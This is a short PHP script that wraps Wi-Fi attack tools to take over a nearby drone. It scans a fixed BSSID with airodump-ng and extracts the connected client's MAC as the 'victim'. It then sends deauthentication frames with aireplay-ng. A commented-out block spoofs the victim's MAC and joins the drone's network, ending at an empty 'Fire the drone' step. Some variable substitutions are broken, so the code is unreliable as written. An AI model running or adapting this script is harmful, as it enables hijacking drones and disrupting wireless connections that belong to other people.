#!/usr/bin/php
<?php
$card = shell_exec('iw dev | awk \'$1=="Interface"{print $2}\' | sed -e \'1d\' ');
$message = "Monitor mode enabled";
$moncheck = shell_exec('iwconfig wlan1 | grep Monitor | sed -e "s/Mode:/ /" | awk \'{print $1}\' | cut -b 5');

//Checks whether card is in monitor mode.
    if ($moncheck == 1) {
                echo "Monitor Enabled";
       }
        else {
       echo "Enable MONITOR MODE on card";
        }
//Search for Drone
echo "Searching for Drone";
//$search = shell_exec('sudo timeout 6 airodump-ng wlan1 --bssid 58:D7:59:31:DA:84 -c 4');
//$wps = shell_exec('sudo timeout 6 wash -i wlan1');
$search = shell_exec('sudo timeout --foreground 5  airodump-ng wlan1 -c 4 --bssid 58:D7:59:31:DA:84 -w /tmp/out --output-format netxml');
//Grab the client and assign it as victim
echo "Snatch";
$victim = shell_exec('cat /tmp/out-01.kismet.netxml | grep client-mac | cut -c 16-32 ');
$host = shell_exec('cat /tmp/out-01.kismet.netxml | grep essid | sed -e "s/<essid cloaked=\"false\">/ /" -e "s/<\/essid>/ /" ');

//Deauthenticate the client
echo "Dauth";
echo exec('aireplay-ng -0 100 -a 58:D7:59:31:DA:84 -c $victim  wlan1');
/*
//Spoof our mac_address to connect to the ardrone
echo "spoof";
$spoof = shell_exec('sudo ifconfig wlan2 down && macchanger --mac $victim wlan2 && ifconfig wlan2 up');

//Connect to the ardrone
echo "connect";
$connect = shell_exec('iwconfig wlan2 essid $host');

//Fire the drone



 */
//Remove all tmp data
echo "rm";
$rem = shell_exec('rm /tmp/out*');

echo "See u Again";

?>

